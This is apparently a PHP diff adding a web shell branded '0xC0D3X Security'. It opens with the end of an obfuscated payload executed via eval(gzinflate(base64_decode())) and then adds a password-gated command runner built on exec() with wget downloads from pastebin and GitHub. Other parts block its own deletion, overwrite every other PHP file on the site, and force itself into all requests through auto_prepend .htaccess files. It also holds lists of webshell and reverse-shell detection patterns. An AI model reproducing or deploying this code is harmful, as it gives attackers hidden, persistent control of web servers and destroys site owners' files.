1Y\x43Q\x615Tmq7J\x42\x43XrMVUo\x631yk3mMQDiH1l\x42npq\x43W58LOI6hNt\x62pp7Npuf\x2bVW2mjev/e5RIW\x2bLhUoI\x63KLxD6dHu17f3guu\x2be17t3f\x62d2PSvGzfdYjzRvpGfKtI0gKX7DIlQr\x427UIVFzRk\x63WPQtSHSls8/VU9O/fQm0\x41\x2bPE\x2b\x63Sy\x62wQo/Vw\x61wK\x62Kqpz\x63gO1Z\x43XjvzQOoLJ09l\x61yYU\x4265LnrPLEVTtYniOgxq\x2bnxMs\x2bg\x42IpOzj\x42s5NRK\x2bmE1Ql\x2be\x626\x2byrrFlNe6\x62NhYOF\x610v\x61X8VMI8yQkM4QMq\x41h5/1E\x61iGQj\x63ZyV9/m\x2b3\x63O09ej4rUgNv9FyTewjt\x62zXU\x629F8jiKZfFqVspp6\x43T9u\x620nKTY5ltnGfQe3862SF82GerET0ezz\x2b\x42jJjEkgYYR9Xd3gtO\x41x\x42/txwk\x2boZ\x43hD6\x43TkKEUd\x42wrVQ\x43j4kN1sTyGn5\x61dWNJVveSrnOt\x61SUz\x612V/\x61OVryU\x63/0\x63HVRl8PZYsr42OEI7DiQP\x61Z\x41zhRRwGg\x42thq\x61wlws\x63\x63IwS5g70Z\x43ED8o27Y0\x63DIZf\x426khTJvhE\x41y\x61Q4IuHr6yrNv5qh0QZRvP55R7GyVW\x41VjT\x2bXk\x43tMTL2KVR90Qg/pu6rU3Wv6\x2bVv7T7P36oj\x42Di6U\x62/OJK1w4o7m\x419K5T5En7gIpEsMEH\x41JXyjOQOkpFF63FMsEnhkZd2t\x62Iemp\x633O\x63U\x61eKZZ9Sx3\x63O4k4H\x41HdGWpEgddWKGhRyynR81\x2bIieURkGIQH6sWKO4xLz\x2bF\x423J5TNx/2Ug/6nU4Lf\x43lf8zdOxP/ZF\x2bwHQD\x2bi85\x41gf60M5VxtQnGtSUUrKSTfGz\x63\x62\x62\x42gKnQ7LTjgn\x42i7keYE\x423MXhQLmK\x4396QhGnf\x41o\x41gg\x615QJT1H3SJ5iRqR3\x43Z7UwWtq5S9qp\x61ZTJN68\x42\x63vXfOQ2INqRHK\x2bKggy6\x62GJD\x43gW0kig\x41Us2PFV2\x42eJeYGSIh8\x63TIozN\x2bIZwMODzSQWfyHfHiEQ24l0R\x41\x43KGlNintwEMqsMgPEE\x61Yf\x61Vg8Y8EyXi8EhjOIdI\x41hvmn8NzhtO\x6108g4\x62xpX1\x61elV/pI\x62hfi\x62RE4\x62IwrNiDiGNe2Tzf\x2bM9fNn26r\x6308fXR/Q\x2b1KErTfekDS/\x41I\x63H\x61ReWH\x41eVNwMKRd9uWWM\x41N0j\x2b\x413RthUEU/fGzOiWMGth/MT\x42Qe\x61kDw9\x2bTFo\x61sp\x43\x413kO/UZ\x42hE\x41hd\x61yXfrd23\x2b3zK\x62XH\x638u6SHxNZu1Q\x410iZRfrjpTZVL90W1RhHfVzO6xhs\x41\x63nmFx0OZs\x2bmPpG7iO\x63TvOlr1o6tj\x42QqGHEsSH6MQyiqr2EE\x43I\x41lG95n\x61Pe\x43/fxG5SuMoE\x61r27TdR6UYnSF1KLg9t2z2iK\x62Jd5QG/whNrZx\x635\x41go1\x62M4S5s\x43IwDGWQSt\x43wgdqOdR/Jljp0Jk7sPNygf/oO\x43\x61hZ69t5\x62hJfdJ8o\x621rQIePY79fP\x2b/R\x62L19zm\x63/RUyQ1DQiF\x42xR5oNl7\x63TT\x42x\x62JlwDjkMP3IUDHjT3OeK\x63o8G\x63\x415F\x41N/ZHMk\x61EeG16qJ5DP08ZgN/7\x439\x43u0IMgNpjDI4\x63OofK\x43n\x62IQNNX0s9XYO0\x62pPvX\x42lDz\x2bMkmsq4oITsm8uLHXPQoD8Oqu\x42fw1\x43U\x61Q3o95FUqWtrMKUVRjhPp\x2byx\x62\x62IvP\x63702\x61zfODPROLp\x41nG2UF4pEypyh\x2b\x2bEHflGGsnSnMP\x43rYXlEF\x41\x63X\x61ZH\x43VILYgL7nvQI5L\x42hqlQ/wk3D\x637\x634er9st3/\x62Hk\x43lVw6sOxi0o4y1qfmi\x430f69PNL579h\x41NEn\x43J4\x43xHP8N5ruPQe0w\x41u07jnKr\x61\x41D8HPE\x41QUEnS4xti5MOlYrWrl9Tq3oMl\x2bsswP\x42d1M5h1YPZTS8f26t\x42/4Q6PhOS\x2b\x43/TsjgP/Vmn\x2bwqv\x61T/fg9ty\x61NEwREyNeP0r/d\x41q7Dox\x61r3LT\x41K5ToygMjRihojOTe0\x2bpvfNp4H\x2b//qV0YpgKkvpgLyOFGhuJwUYHhsH4klP7kNKNuVqMxJJEkxPjSMUd\x2bovGyMES5HIS\x61X\x2br/Y\x42Z\x61I0vkhRsw/\x2bef1Pg8\x42PGvpyHrX\x639y3fIeTKfr\x43EE3v3\x63zfqfO7f3ns3\x2bP07hkFgHwV\x4103h\x62f3eGZ\x62f\x63I\x63T3eku3H\x62v/RHE\x43xHfeu\x42X\x41EkZIn0En0e\x41FY8X6d\x42\x43/89tFW\x2bZEE\x2bFNeI4jHP\x63Y1DiUY\x63vkMt\x63\x61tggD3yrj\x41LlIJw49oyEWJPL\x42\x430sjZ\x422w6Wtq2J\x62zSvunXnGv79v92OS36TXKY433li6/nOQLHdlWH\x2bL/OuPe39OYv6gUfpKfX9uze6Uk6\x62SS2giPey\x41W7jn2Vr99\x611mddLxm\x62Uu2Nf3t0\x62QWlqo\x61RXvHMP\x43zT28YNs\x619s/mZi59\x41s1x4qI\x41o\x63LJ3RHDSTw\x63S\x41M4OnYnzgQiweTymtT2WO4i6dVy6/g\x62Ny\x62\x621691O19tig\x42wJeUL3KNG\x411ttik\x42wJeUL2KdG\x411dtio\x42wJeUL1KtG\x411Ntis\x42wJe";eval(htmlspecialchars_decode(gzinflate(base64_decode($Apaaja))));exit;?>
+<?php
+// ============= SUPER MOD SECURITY BY 0xC0D3X =============
+$SESSION_TIMEOUT = 1800; // Session timeout in seconds (30 minutes)
+
+session_start();
+ob_start();
+
+// Default password - CHANGE THIS IN PRODUCTION!
+$DEFAULT_PASSWORD = "GeoDevz69#";
+$SECURITY_KEY = "0xC0D3X_" . md5($DEFAULT_PASSWORD);
+
+// Get current script filename for protection
+$current_script = basename(__FILE__);
+
+// Check if user is logged in
+$logged_in = isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
+$key_valid = isset($_SESSION['security_key']) && $_SESSION['security_key'] === $SECURITY_KEY;
+
+// Handle logout
+if (isset($_GET['logout'])) {
+    session_destroy();
+    header("Location: " . $_SERVER['PHP_SELF']);
+    exit;
+}
+
+// Handle login
+if (isset($_POST['password']) && !$logged_in) {
+    if ($_POST['password'] === $DEFAULT_PASSWORD) {
+        $_SESSION['logged_in'] = true;
+        $_SESSION['security_key'] = $SECURITY_KEY;
+        $_SESSION['login_time'] = time();
+        $logged_in = true;
+        $key_valid = true;
+    } else {
+        $login_error = "Invalid password!";
+    }
+}
+
+// Handle GET KEY request
+if (isset($_POST['get_key']) && isset($_POST['password'])) {
+    if ($_POST['password'] === $DEFAULT_PASSWORD) {
+        $key_display = $SECURITY_KEY;
+    } else {
+        $login_error = "Invalid password for key generation!";
+    }
+}
+
+// Check session timeout
+if ($logged_in && isset($_SESSION['login_time']) && (time() - $_SESSION['login_time']) > $SESSION_TIMEOUT) {
+    session_destroy();
+    $logged_in = false;
+    $key_valid = false;
+    header("Location: " . $_SERVER['PHP_SELF']);
+    exit;
+}
+
+// ============= ADVANCED PROTECTION FUNCTIONS =============
+
+/**
+ * Check if file is allowed (0xC0D3X files or index.php)
+ */
+function isAllowedFile($filename) {
+    global $current_script;
+    
+    // Always allow the current script itself
+    if ($filename === $current_script) {
+        return true;
+    }
+    
+    // Allow index.php
+    if (strtolower($filename) === 'index.php') {
+        return true;
+    }
+    
+    $file_lower = strtolower($filename);
+    
+    // STRICT PATTERN: Must start with 0xc0d3x or codex/squad
+    $allowed_patterns = [
+        // Exact 0xC0D3X format with underscore
+        '/^0xc0d3x_[a-z0-9_\-]+\.(php|txt|log|html|htm)$/',
+        // Exact 0xC0D3X.php format
+        '/^0xc0d3x\.php$/',
+        // Codex Squad variations
+        '/^codex_[a-z0-9_\-]+\.(php|txt|log)$/',
+        '/^squad_[a-z0-9_\-]+\.(php|txt|log)$/',
+        // Allow specific configuration files
+        '/^config_[a-z0-9_\-]+\.php$/',
+        '/^settings_[a-z0-9_\-]+\.php$/',
+    ];
+    
+    foreach ($allowed_patterns as $pattern) {
+        if (preg_match($pattern, $file_lower)) {
+            return true;
+        }
+    }
+    
+    return false;
+}
+
+/**
+ * Get all PHP file extensions (case-insensitive)
+ */
+function getPhpExtensions() {
+    return [
+        'php', 'phtml', 'phps', 'php3', 'php4', 'php5', 'php6', 'php7', 'php8', 
+        'php9', 'inc', 'module', 'plugin', 'php2', 'php1', 'php0',
+        // Case variations
+        'PHP', 'Php', 'pHp', 'phP', 'PHp', 'pHP', 'PhP'
+    ];
+}
+
+/**
+ * Check if file is a PHP file (by extension or content)
+ */
+function isPhpFile($filename, $filepath = null) {
+    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
+    $php_extensions = getPhpExtensions();
+    
+    // Check by extension
+    if (in_array($ext, $php_extensions)) {
+        return true;
+    }
+    
+    // Additional check by file content (for obfuscated/misnamed files)
+    if ($filepath && file_exists($filepath)) {
+        $content = @file_get_contents($filepath, false, null, 0, 2048);
+        if ($content) {
+            // Check for PHP opening tags (including short tags)
+            $php_indicators = [
+                '<?php', '<?=', '<?', 
+                '<script language="php">', 
+                '<%', '<%=', 
+                'phar://', 'php://'
+            ];
+            
+            foreach ($php_indicators as $indicator) {
+                if (stripos($content, $indicator) !== false) {
+                    return true;
+                }
+            }
+            
+            // Check for common PHP functions
+            $php_functions = [
+                'eval(', 'base64_decode(', 'system(', 'shell_exec(',
+                'exec(', 'passthru(', 'popen(', 'proc_open(',
+                'assert(', 'create_function(', 'include(', 'require(',
+                '$_GET[', '$_POST[', '$_REQUEST[', '$_COOKIE['
+            ];
+            
+            foreach ($php_functions as $func) {
+                if (stripos($content, $func) !== false) {
+                    return true;
+                }
+            }
+        }
+    }
+    
+    return false;
+}
+
+/**
+ * Block/Neutralize a malicious file
+ */
+function blockFile($filepath) {
+    if (!file_exists($filepath)) {
+        return false;
+    }
+    
+    // Check if already blocked
+    $content = @file_get_contents($filepath, false, null, 0, 200);
+    $is_already_blocked = $content && (
+        strpos($content, '💢 Unauthorized Access Denied 💢') !== false || 
+        strpos($content, 'Blocked by 0xC0D3X') !== false ||
+        strpos($content, '0xC0D3X PROTECTION SYSTEM') !== false
+    );
+    
+    if ($is_already_blocked) {
+        return true;
+    }
+    
+    // Create blocking content
+    $blocked_content = <<<'PHP'
+<?php
+// ============= 0xC0D3X PROTECTION SYSTEM =============
+// This file has been automatically blocked by 0xC0D3X Security
+// Original content has been neutralized to prevent malicious use
+
+header('HTTP/1.1 403 Forbidden');
+header('Content-Type: text/plain; charset=utf-8');
+
+$client_ip = $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
+$request_uri = $_SERVER['REQUEST_URI'] ?? 'UNKNOWN';
+$timestamp = date('Y-m-d H:i:s');
+
+$log_message = "[$timestamp] BLOCKED ACCESS - IP: $client_ip | URI: $request_uri | File: " . basename(__FILE__) . "\n";
+@file_put_contents(dirname(__FILE__) . '/0xc0d3x_security.log', $log_message, FILE_APPEND);
+
+die('💢 Unauthorized Access Denied 💢' . "\n" . 
+    'This file has been blocked by 0xC0D3X Security System' . "\n" .
+    'Timestamp: ' . $timestamp . "\n" .
+    'Your IP: ' . $client_ip);
+?>
+PHP;
+
+    // Write blocking content
+    if (@file_put_contents($filepath, $blocked_content)) {
+        @chmod($filepath, 0444); // Read-only
+        return true;
+    }
+    
+    return false;
+}
+
+/**
+ * Continuous file monitoring and protection
+ */
+function runContinuousFileProtection() {
+    global $current_script;
+    static $last_run = 0;
+    static $cache = [];
+    
+    // Run at most once per 0.5 seconds
+    $current_time = microtime(true);
+    if ($current_time - $last_run < 0.5) {
+        return isset($cache['blocked_count']) ? $cache['blocked_count'] : 0;
+    }
+    
+    $last_run = $current_time;
+    $root_dir = dirname(__FILE__);
+    $blocked_count = 0;
+    $php_extensions = getPhpExtensions();
+    
+    // Fast directory scanning function
+    function scanDirectoryRecursive($dir, &$results = []) {
+        $files = @scandir($dir);
+        if (!$files) return $results;
+        
+        foreach ($files as $value) {
+            $path = $dir . DIRECTORY_SEPARATOR . $value;
+            if (!is_readable($path)) continue;
+            
+            if (!in_array($value, ['.', '..', '.git', '.svn', '.hg', 'node_modules', 'vendor'])) {
+                if (is_dir($path)) {
+                    scanDirectoryRecursive($path, $results);
+                } else {
+                    $results[] = $path;
+                }
+            }
+        }
+        return $results;
+    }
+    
+    // Get all files in the directory tree
+    $all_files = scanDirectoryRecursive($root_dir);
+    
+    foreach ($all_files as $file_path) {
+        $filename = basename($file_path);
+        
+        // Skip current script and index.php
+        if ($filename === $current_script || strtolower($filename) === 'index.php') {
+            continue;
+        }
+        
+        // Check if it's a PHP file
+        if (isPhpFile($filename, $file_path)) {
+            // Check if it's an allowed file
+            if (!isAllowedFile($filename)) {
+                if (blockFile($file_path)) {
+                    $blocked_count++;
+                }
+            }
+        }
+        
+        // Also check for suspicious file names even with non-PHP extensions
+        $suspicious_patterns = [
+            '/shell/i', '/backdoor/i', '/wso/i', '/c99/i', '/r57/i', '/b374k/i',
+            '/uploader/i', '/cmd/i', '/hack/i', '/exploit/i', '/malicious/i',
+            '/webshell/i', '/cgi-?shell/i', '/browser/i', '/adminer/i',
+            '/phpmyadmin/i', '/sqlmap/i', '/metasploit/i'
+        ];
+        
+        foreach ($suspicious_patterns as $pattern) {
+            if (preg_match($pattern, $filename)) {
+                if (blockFile($file_path)) {
+                    $blocked_count++;
+                    break;
+                }
+            }
+        }
+    }
+    
+    // Cache the result
+    $cache['blocked_count'] = $blocked_count;
+    $cache['last_check'] = time();
+    
+    return $blocked_count;
+}
+
+/**
+ * Advanced webshell detection
+ */
+function scanForWebshells() {
+    global $current_script;
+    $current_dir = dirname(__FILE__);
+    $webshells_found = [];
+    
+    $webshell_patterns = [
+        // PHP execution patterns
+        '/eval\s*\(\s*(\$_(GET|POST|REQUEST|COOKIE|SERVER)|base64_decode|urldecode|str_rot13)/i',
+        '/base64_decode\s*\(\s*(\$_(GET|POST|REQUEST|COOKIE)|\$_SERVER)/i',
+        '/system\s*\(\s*(\$_(GET|POST|REQUEST|COOKIE)|\$_SERVER)/i',
+        '/shell_exec\s*\(\s*(\$_(GET|POST|REQUEST|COOKIE)|\$_SERVER)/i',
+        '/exec\s*\(\s*(\$_(GET|POST|REQUEST|COOKIE)|\$_SERVER)/i',
+        '/passthru\s*\(\s*(\$_(GET|POST|REQUEST|COOKIE)|\$_SERVER)/i',
+        '/assert\s*\(\s*(\$_(GET|POST|REQUEST|COOKIE)|\$_SERVER)/i',
+        '/preg_replace\s*\(\s*["\']\/\.\*["\']/i',
+        '/create_function\s*\(/i',
+        
+        // Dangerous includes
+        '/include\s*\(\s*(\$_(GET|POST|REQUEST|COOKIE)|\$_SERVER)/i',
+        '/require\s*\(\s*(\$_(GET|POST|REQUEST|COOKIE)|\$_SERVER)/i',
+        '/include_once\s*\(\s*(\$_(GET|POST|REQUEST|COOKIE)|\$_SERVER)/i',
+        '/require_once\s*\(\s*(\$_(GET|POST|REQUEST|COOKIE)|\$_SERVER)/i',
+        
+        // Obfuscation patterns
+        '/gzuncompress\s*\(\s*base64_decode/i',
+        '/gzinflate\s*\(\s*base64_decode/i',
+        '/str_rot13\s*\(\s*base64_decode/i',
+        
+        // Command execution via backticks
+        '/`\s*\$_(GET|POST|REQUEST|COOKIE)/i',
+        
+        // PHP tags in variables
+        '/<\?php\s+\$_(GET|POST|REQUEST|COOKIE)/i',
+        '/echo\s+\$_(GET|POST|REQUEST|COOKIE)\s*\[\s*["\']cmd["\']\s*\]/i',
+        
+        // File manipulation for malicious purposes
+        '/fopen\s*\(\s*["\']\.\.\//i',
+        '/file_put_contents\s*\(\s*["\'](\.php|\.phtml|\.phps)/i',
+        
+        // Network functions for reverse shells
+        '/fsockopen\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)/i',
+        '/socket_create\s*\(\s*.*\)\s*;\s*socket_connect/i',
+    ];
+    
+    $dangerous_extensions = array_merge(
+        getPhpExtensions(),
+        ['.pl', '.cgi', '.py', '.sh', '.rb', '.exe', '.bat', '.cmd', '.jar', '.war']
+    );
+    
+    // Scan directory recursively
+    $dir_iterator = new RecursiveDirectoryIterator($current_dir, RecursiveDirectoryIterator::SKIP_DOTS);
+    $iterator = new RecursiveIteratorIterator($dir_iterator, RecursiveIteratorIterator::SELF_FIRST);
+    
+    foreach ($iterator as $file) {
+        if ($file->isFile()) {
+            $file_path = $file->getPathname();
+            $filename = $file->getFilename();
+            
+            // Skip current script and index.php
+            if ($filename === $current_script || strtolower($filename) === 'index.php') {
+                continue;
+            }
+            
+            $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
+            $full_ext = '.' . $ext;
+            
+            if (in_array($full_ext, $dangerous_extensions) || isPhpFile($filename, $file_path)) {
+                $content = @file_get_contents($file_path);
+                if ($content) {
+                    // Skip already blocked files
+                    if (strpos($content, '💢 Unauthorized Access Denied 💢') !== false || 
+                        strpos($content, '0xC0D3X PROTECTION SYSTEM') !== false) {
+                        continue;
+                    }
+                    
+                    $is_webshell = false;
+                    
+                    // Check patterns
+                    foreach ($webshell_patterns as $pattern) {
+                        if (preg_match($pattern, $content)) {
+                            $is_webshell = true;
+                            break;
+                        }
+                    }
+                    
+                    // Check for suspicious variable names
+                    $suspicious_vars = ['password', 'passwd', 'pass', 'cmd', 'command', 'exec', 'shell', 'backdoor'];
+                    foreach ($suspicious_vars as $var) {
+                        if (preg_match('/\$_(' . strtoupper($var) . '|' . $var . ')/i', $content)) {
+                            $is_webshell = true;
+                            break;
+                        }
+                    }
+                    
+                    if ($is_webshell) {
+                        $webshells_found[] = $file_path;
+                        if (blockFile($file_path)) {
+                            // Log the detection
+                            $log_message = "[" . date('Y-m-d H:i:s') . "] WEBSHELL DETECTED AND BLOCKED: " . $file_path . "\n";
+                            @file_put_contents(dirname(__FILE__) . '/0xc0d3x_security.log', $log_message, FILE_APPEND);
+                        }
+                    }
+                }
+            }
+        }
+    }
+    
+    return $webshells_found;
+}
+
+/**
+ * Install global .htaccess protection
+ */
+function installGlobalProtection() {
+    global $current_script;
+    $root_dir = dirname(__FILE__);
+    
+    // Enhanced .htaccess content
+    $htaccess_content = <<<HTACCESS
+# ============= 0xC0D3X GLOBAL PROTECTION =============
+# Auto-generated by 0xC0D3X Security System
+
+# Force PHP auto-prepend for all PHP files
+<FilesMatch "\.(php|phtml|phps|php[0-9]*|inc|module|plugin)$">
+    php_value auto_prepend_file "{$root_dir}/{$current_script}"
+</FilesMatch>
+
+# Block dangerous file extensions
+<FilesMatch "\.(htaccess|htpasswd|ini|log|sh|bak|sql|tar|gz|zip|rar|exe|bat|cmd)$">
+    Order allow,deny
+    Deny from all
+</FilesMatch>
+
+# Block common webshell names
+<FilesMatch "(wso|shell|backdoor|c99|r57|b374k|uploader|cmd)\.(php|phtml|phps)$">
+    Order allow,deny
+    Deny from all
+</FilesMatch>
+
+# Prevent directory listing
+Options -Indexes
+
+# Security headers
+<IfModule mod_headers.c>
+    Header set X-Content-Type-Options nosniff
+    Header set X-Frame-Options DENY
+    Header set X-XSS-Protection "1; mode=block"
+</IfModule>
+
+# Disable PHP execution in upload directories (common pattern)
+<IfModule mod_rewrite.c>
+    RewriteEngine On
+    RewriteRule ^(uploads|images|files|tmp)/.*\.(php|phtml|phps|php[0-9]*)$ - [F,NC]
+</IfModule>
+HTACCESS;
+    
+    // Install .htaccess in all directories
+    $dir_iterator = new RecursiveDirectoryIterator($root_dir, RecursiveDirectoryIterator::SKIP_DOTS);
+    $iterator = new RecursiveIteratorIterator($dir_iterator, RecursiveIteratorIterator::SELF_FIRST);
+    
+    $installed_count = 0;
+    foreach ($iterator as $file) {
+        if ($file->isDir()) {
+            $htaccess_file = $file->getPathname() . '/.htaccess';
+            if (@file_put_contents($htaccess_file, $htaccess_content)) {
+                @chmod($htaccess_file, 0444);
+                $installed_count++;
+            }
+        }
+    }
+    
+    // Also in root directory
+    @file_put_contents($root_dir . '/.htaccess', $htaccess_content);
+    @chmod($root_dir . '/.htaccess', 0444);
+    $installed_count++;
+    
+    return $installed_count;
+}
+
+/**
+ * Global protection interceptor - runs on every request
+ */
+function globalProtectionInterceptor() {
+    global $current_script;
+    
+    // Get the actual executing script
+    if (isset($_SERVER['SCRIPT_FILENAME'])) {
+        $executing_script = basename($_SERVER['SCRIPT_FILENAME']);
+    } elseif (isset($_SERVER['PHP_SELF'])) {
+        $executing_script = basename($_SERVER['PHP_SELF']);
+    } else {
+        $executing_script = 'unknown';
+    }
+    
+    // Skip if it's our main script or index.php
+    if ($executing_script === $current_script || strtolower($executing_script) === 'index.php') {
+        return;
+    }
+    
+    // Check if file is NOT an allowed file
+    if (!isAllowedFile($executing_script)) {
+        // Check if it's a PHP file
+        $script_path = isset($_SERVER['SCRIPT_FILENAME']) ? $_SERVER['SCRIPT_FILENAME'] : '';
+        if ($script_path && file_exists($script_path) && isPhpFile($executing_script, $script_path)) {
+            // Block the file
+            if (blockFile($script_path)) {
+                // Log the block
+                $log_message = "[" . date('Y-m-d H:i:s') . "] REAL-TIME BLOCK: " . $script_path . " | IP: " . ($_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN') . "\n";
+                @file_put_contents(dirname(__FILE__) . '/0xc0d3x_security.log', $log_message, FILE_APPEND);
+            }
+        }
+        
+        // Block access
+        header('HTTP/1.1 403 Forbidden');
+        header('Content-Type: text/plain; charset=utf-8');
+        die('💢 Unauthorized Access Denied 💢' . "\n" . 
+            'This file has been blocked by 0xC0D3X Security System' . "\n" .
+            'Timestamp: ' . date('Y-m-d H:i:s') . "\n" .
+            'Your IP: ' . ($_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN'));
+    }
+}
+
+/**
+ * Initialize protection system
+ */
+function initializeProtection() {
+    // Create security log if it doesn't exist
+    $log_file = dirname(__FILE__) . '/0xc0d3x_security.log';
+    if (!file_exists($log_file)) {
+        $log_header = "=== 0xC0D3X SECURITY LOG ===\n";
+        $log_header .= "Created: " . date('Y-m-d H:i:s') . "\n";
+        $log_header .= "System initialized\n";
+        $log_header .= str_repeat("=", 40) . "\n\n";
+        @file_put_contents($log_file, $log_header);
+        @chmod($log_file, 0600);
+    }
+    
+    // Run initial scan
+    runContinuousFileProtection();
+}
+
+/**
+ * Safe command execution with wget support
+ */
+function executeSafeCommand($command) {
+    global $current_script;
+    
+    // Trim and clean the command
+    $command = trim($command);
+    if (empty($command)) {
+        return ["No command provided"];
+    }
+    
+    // Get allowed wget URLs (whitelist for security)
+    $allowed_domains = [
+        'github.com', 'raw.githubusercontent.com', 'pastebin.com', 'gist.githubusercontent.com',
+        'gitlab.com', 'bitbucket.org'
+    ];
+    
+    // Dangerous patterns that should be blocked
+    $dangerous_patterns = [
+        // Self-destruction patterns
+        '/rm\s+.*' . preg_quote($current_script, '/') . '/i',
+        '/unlink\s*\(.*' . preg_quote($current_script, '/') . '/i',
+        '/file_put_contents\s*\(.*' . preg_quote($current_script, '/') . '/i',
+        
+        // Dangerous system commands
+        '/rm\s+-rf\s+\/\s*$/',
+        '/rm\s+-rf\s+\.\.\/\.\.\//',
+        '/dd\s+if=/',
+        '/mkfs/',
+        '/fdisk/',
+        
+        // PHP execution strings
+        '/php\s+-r\s+/i',
+        '/echo\s+.*<\?php/i',
+        
+        // Network abuse
+        '/nc\s+.*-e\s+/i',
+        '/bash\s+-i\s+>/',
+        '/nmap/',
+        '/hydra/',
+        
+        // Excessive file operations
+        '/find\s+.*-exec\s+rm/i',
+        '/chmod\s+777\s+/',
+        '/chown\s+-R/',
+    ];
+    
+    // Check for dangerous patterns
+    foreach ($dangerous_patterns as $pattern) {
+        if (preg_match($pattern, $command)) {
+            return ["COMMAND BLOCKED: Security restriction - Dangerous pattern detected"];
+        }
+    }
+    
+    // Check for wget/curl commands specifically
+    if (preg_match('/^(wget|curl)\s+/i', $command)) {
+        // Extract URL from command
+        $url_pattern = '/https?:\/\/[^\s<>"\']+/i';
+        preg_match($url_pattern, $command, $url_matches);
+        
+        if (!empty($url_matches)) {
+            $url = $url_matches[0];
+            $domain = parse_url($url, PHP_URL_HOST);
+            
+            // Check if domain is allowed
+            $domain_allowed = false;
+            foreach ($allowed_domains as $allowed_domain) {
+                if (strpos($domain, $allowed_domain) !== false) {
+                    $domain_allowed = true;
+                    break;
+                }
+            }
+            
+            if (!$domain_allowed) {
+                return ["COMMAND BLOCKED: Domain not allowed for wget/curl: $domain"];
+            }
+            
+            // Check for dangerous file extensions in wget output
+            $dangerous_extensions = [
+                '\.php', '\.phtml', '\.phps', '\.php\d+', '\.inc',
+                '\.sh', '\.pl', '\.py', '\.rb', '\.exe', '\.bat', '\.cmd'
+            ];
+            
+            $extension_pattern = '/\.(' . implode('|', $dangerous_extensions) . ')(\?|$)/i';
+            
+            // Check output file in wget command
+            if (preg_match('/-O\s+([^\s]+)/i', $command, $output_matches)) {
+                $output_file = $output_matches[1];
+                if (preg_match($extension_pattern, $output_file)) {
+                    // But allow 0xC0D3X.php files
+                    if (!preg_match('/0xc0d3x\.php$/i', $output_file)) {
+                        return ["COMMAND BLOCKED: Cannot download dangerous file types"];
+                    }
+                }
+            }
+        }
+    }
+    
+    // Limit command length
+    if (strlen($command) > 500) {
+        return ["COMMAND BLOCKED: Command too long (max 500 characters)"];
+    }
+    
+    // Execute the command
+    $output = [];
+    $return_var = 0;
+    
+    // Set execution time limit
+    set_time_limit(10);
+    
+    // Execute command
+    exec($command . ' 2>&1', $output, $return_var);
+    
+    // If command executed successfully and was a wget for 0xC0D3X.php,
+    // run immediate protection scan on the downloaded file
+    if ($return_var === 0 && preg_match('/wget.*0xc0d3x\.php/i', $command)) {
+        // Extract output file path
+        if (preg_match('/-O\s+([^\s]+)/i', $command, $matches)) {
+            $downloaded_file = $matches[1];
+            if (file_exists($downloaded_file)) {
+                // Run protection on the downloaded file
+                runContinuousFileProtection();
+                $output[] = "\n✓ 0xC0D3X Protection: Downloaded file secured";
+            }
+        }
+    }
+    
+    return $output;
+}
+
+// ============= MAIN PROTECTION EXECUTION =============
+// Initialize protection system
+initializeProtection();
+
+// Run global protection on EVERY request
+globalProtectionInterceptor();
+
+// Run CONTINUOUS file protection on EVERY request
+$blocked_files = runContinuousFileProtection();
+
+// Install global protection if requested
+if ($logged_in && isset($_GET['install'])) {
+    $installed_count = installGlobalProtection();
+    $install_success = "Global protection installed in $installed_count directories";
+}
+
+// Run webshell scan only when logged in
+if ($logged_in) {
+    $detected_webshells = scanForWebshells();
+} else {
+    $detected_webshells = [];
+}
+
+// Continue with the rest of your HTML/PHP code...
+ob_end_flush();
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>0xC0D3X Mobile</title>
+    <style>
+        /* [KEEP ALL YOUR EXISTING CSS STYLES HERE - NO CHANGES] */
+        /* MOBILE PORTRAIT ONLY UI */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoo UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            background: #f0f0f0;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 15px;
+            color: #333;
+            touch-action: manipulation;
+            overflow-x: hidden;
+        }
+        
+        /* Force portrait orientation */
+        @media screen and (min-width: 600px) {
+            body::before {
+                content: "Please rotate your device to portrait mode";
+                position: fixed;
+                top: 0;
+                left: 0;
+                right: 0;
+                bottom: 0;
+                background: #f0f0f0;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                font-size: 20px;
+                font-weight: bold;
+                color: #333;
+                text-align: center;
+                padding: 20px;
+                z-index: 9999;
+            }
+        }
+        
+        .neumorphic-container {
+            background: #f0f0f0;
+            border-radius: 20px;
+            padding: 15px;
+            box-shadow: 
+                12px 12px 24px #d9d9d9,
+                -12px -12px 24px #ffffff;
+            width: 100%;
+            max-width: 100%;
+            border: 1px solid rgba(255, 255, 255, 0.5);
+            position: relative;
+            overflow: hidden;
+            margin: auto;
+        }
+        
+        .neumorphic-container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, #f0f0f0, rgba(0,0,0,0.1), #f0f0f0);
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 2px solid rgba(0, 0, 0, 0.08);
+        }
+        
+        .title {
+            color: #333;
+            font-size: 1.5em;
+            font-weight: 900;
+            letter-spacing: 0.5px;
+            margin-bottom: 5px;
+            text-transform: uppercase;
+        }
+        
+        .subtitle {
+            color: #666;
+            font-size: 0.85em;
+            font-weight: 400;
+            letter-spacing: 0.3px;
+        }
+        
+        .login-container, .command-interface {
+            background: #f0f0f0;
+            border-radius: 15px;
+            padding: 15px;
+            margin-bottom: 15px;
+            box-shadow: 
+                inset 4px 4px 8px #e0e0e0,
+                inset -4px -4px 8px #ffffff;
+            border: 1px solid rgba(255, 255, 255, 0.5);
+        }
+        
+        .form-group {
+            margin-bottom: 15px;
+        }
+        
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
